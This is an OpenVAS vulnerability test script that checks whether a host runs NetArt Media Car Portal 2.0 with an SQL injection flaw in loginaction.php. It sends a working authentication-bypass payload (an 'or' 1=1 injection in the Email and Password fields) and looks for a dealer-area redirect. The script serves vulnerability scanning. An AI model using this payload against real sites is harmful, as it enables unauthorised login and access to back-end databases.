##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_nam_carportal_sql_inj_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# NetArt Media Car Portal SQL injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902475");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-09-23 16:39:49 +0200 (Fri, 23 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("NetArt Media Car Portal SQL injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://securityreason.com/wlb_show/WLB-2011090081");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/105210/carportal20-sqlbypass.txt");

  script_tag(name:"insight", value:"The flaw exists due to the error in 'loginaction.php', which
  fails to sufficiently sanitize user-supplied data in 'Email' and 'Password' parameters.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running NetArt Media Car Portal and is prone SQL
  injection vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass the
  security restrictions or view, add, modify back-end database.");

  script_tag(name:"affected", value:"NetArt Media Car Portal Version 2.0.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/autoportal1", "/carportal", "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache( item:dir + "/index.php", port:port );

  if( '">Car Portal<' >< rcvRes && 'netartmedia' >< rcvRes ) {

    filename = dir + "/loginaction.php";
    authVariables ="Email=%27or%27+1%3D1&Password=%27or%27+1%3D1";

    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "User-Agent: ", http_get_user_agent(), "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);
    rcvRes = http_keepalive_send_recv( port:port, data:sndReq );

    if( "Location: DEALERS/index.php" >< rcvRes ) {
      report = report_vuln_url( port:port, url:filename );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );